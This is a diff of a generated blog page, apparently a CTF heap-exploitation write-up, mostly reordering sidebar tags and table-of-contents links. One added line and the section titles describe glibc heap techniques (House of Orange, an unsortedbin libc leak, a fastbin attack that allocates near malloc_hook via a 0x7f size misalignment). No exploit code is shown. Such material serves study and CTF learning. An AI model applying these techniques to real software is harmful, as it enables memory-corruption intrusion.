+<p>fastbin attack的利用是基于在malloc_hook附近申请并分配一个0x70大小chunk（利用0x7f的字节错位来伪造一个0x70的fastbin范围内的size域）。</p>
+</li>
 </ul>
 
     </article>
@@ -698,7 +712,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%86%85%E5%AE%B9"><span class="toc-number">1.</span> <span class="toc-text">题目内容</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#add%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">add：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#edit%EF%BC%9A%E6%BA%A2%E5%87%BA8%E5%AD%97%E8%8A%82"><span class="toc-number">1.2.</span> <span class="toc-text">edit：溢出8字节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete%EF%BC%9AUAF"><span class="toc-number">1.3.</span> <span class="toc-text">delete：UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">show：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%E5%92%8C%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="toc-number">3.</span> <span class="toc-text">操作过程和问题解决</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Orange%E4%B8%8Efencepost-chunk"><span class="toc-number">3.1.</span> <span class="toc-text">House of Orange与fencepost chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsortedbin-leak-libc%EF%BC%8C%E5%88%87%E5%89%B2old-top"><span class="toc-number">3.2.</span> <span class="toc-text">unsortedbin leak libc，切割old top</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-attack-alloc-2-malloc-hook"><span class="toc-number">3.3.</span> <span class="toc-text">fastbin attack: alloc 2 malloc_hook</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">技巧总结：</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">题目内容</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#add%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">add：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#edit%EF%BC%9A%E6%BA%A2%E5%87%BA8%E5%AD%97%E8%8A%82"><span class="toc-number">1.2.</span> <span class="toc-text">edit：溢出8字节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete%EF%BC%9AUAF"><span class="toc-number">1.3.</span> <span class="toc-text">delete：UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">show：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">操作过程和问题解决</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Orange%E4%B8%8Efencepost-chunk"><span class="toc-number">3.1.</span> <span class="toc-text">House of Orange与fencepost chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsortedbin-leak-libc%EF%BC%8C%E5%88%87%E5%89%B2old-top"><span class="toc-number">3.2.</span> <span class="toc-text">unsortedbin leak libc，切割old top</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-attack-alloc-2-malloc-hook"><span class="toc-number">3.3.</span> <span class="toc-text">fastbin attack: alloc 2 malloc_hook</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">技巧总结：</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -978,6 +992,12 @@
         
         
     
+        
+        
+        
+        
+        
+        
         
         
         
@@ -1800,24 +1820,9 @@
                 算法
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Android">
-                <span class="iconfont-archer">&#xe606;</span>
-                Android
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="逆向">
-                <span class="iconfont-archer">&#xe606;</span>
-                逆向
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="pwn">
                 <span class="iconfont-archer">&#xe606;</span>
                 pwn
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="chop">
-                <span class="iconfont-archer">&#xe606;</span>
-                chop
             </span>
         
             <span class="sidebar-tag-name" data-tags="wp">
@@ -1830,6 +1835,21 @@
                 heap
             </span>
         
+            <span class="sidebar-tag-name" data-tags="Android">
+                <span class="iconfont-archer">&#xe606;</span>
+                Android
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="chop">
+                <span class="iconfont-archer">&#xe606;</span>
+                chop
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="CSAPP">
                 <span class="iconfont-archer">&#xe606;</span>
                 CSAPP
@@ -1838,6 +1858,11 @@
             <span class="sidebar-tag-name" data-tags="Lab">
                 <span class="iconfont-archer">&#xe606;</span>
                 Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
             </span>
         
             <span class="sidebar-tag-name" data-tags="Windows">
@@ -1850,19 +1875,9 @@
                 CVE
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Develop">
-                <span class="iconfont-archer">&#xe606;</span>
-                Develop
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="protobuf">
                 <span class="iconfont-archer">&#xe606;</span>
                 protobuf
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="kernel">
-                <span class="iconfont-archer">&#xe606;</span>
-                kernel
             </span>
         
             <span class="sidebar-tag-name" data-tags="FSOP">
@@ -1870,14 +1885,19 @@
                 FSOP
             </span>
         
-            <span class="sidebar-tag-name" data-tags="llvm">
+            <span class="sidebar-tag-name" data-tags="kernel">
                 <span class="iconfont-archer">&#xe606;</span>
-                llvm
+                kernel
             </span>
         
             <span class="sidebar-tag-name" data-tags="Rust">
                 <span class="iconfont-archer">&#xe606;</span>
                 Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="llvm">
+                <span class="iconfont-archer">&#xe606;</span>
+                llvm
             </span>
         
             <span class="sidebar-tag-name" data-tags="vm">
